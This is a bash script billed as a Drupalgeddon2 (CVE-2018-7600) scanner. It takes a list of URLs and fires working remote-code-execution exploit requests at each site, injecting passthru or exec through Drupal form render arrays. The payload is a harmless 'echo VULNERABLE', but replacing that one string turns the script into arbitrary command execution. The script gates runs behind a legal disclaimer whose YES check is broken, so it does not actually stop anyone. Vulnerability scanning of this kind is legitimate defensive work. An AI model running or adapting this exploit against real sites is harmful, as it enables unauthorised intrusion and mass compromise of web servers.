#! /bin/bash

if [[ $# -ne 1 ]] ; then
    echo 'USAGE: '$0' [filename of URL LIST]'
    exit 1
fi

sites=`cat $1`
payload="echo+VULNERABLE"

echo "====================================="
echo "Drupalgeddon2 (CVE-2018-7600) Scanner"
echo "====================================="
echo ""
echo "Disclaimer: This tool uses POC code which exploits a vulnerability on Drupal webservers. Use of this tool on sites you do not have written permission to test MAY BE ILLEGAL"
echo ""
echo "If you still want to continue type YES and hit [ENTER]"
read disclaimer

if [[ $disclaimer -eq "YES" ]] ; then
  echo 'Continuing...'
  echo ""
else
  echo 'Quitting...'
  exit 1
fi


echo "---------------------------------"
echo "TESTING DRUPAL <7.58 POC exploit:"
echo "---------------------------------"

for site_url in $sites;do
  echo "[+] Testing "$site_url
  form_build_id=$(curl -k -s $site_url'/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]='$payload --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id | sed -E 's/.*name="form_build_id" value="(.*)".*/\1/' )
  if [[ ! -z $form_build_id ]] ; then
    curl -k -s $site_url'/?q=file/ajax/name/%23value/'$form_build_id --data "form_build_id="$form_build_id | grep VULNERABLE
  fi
  echo ""
done

echo ""
echo "-------------------------------------------------------"
echo "TESTING DRUPAL < 8.3.9 / < 8.4.6 / < 8.5.1 POC exploit:"
echo "-------------------------------------------------------"

for site_url in $sites;do
  echo "[+] Testing "$site_url
  curl -k -s $site_url'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=echo+VULNERABLE' | grep VULNERABLE
  echo ""
done

exit 1
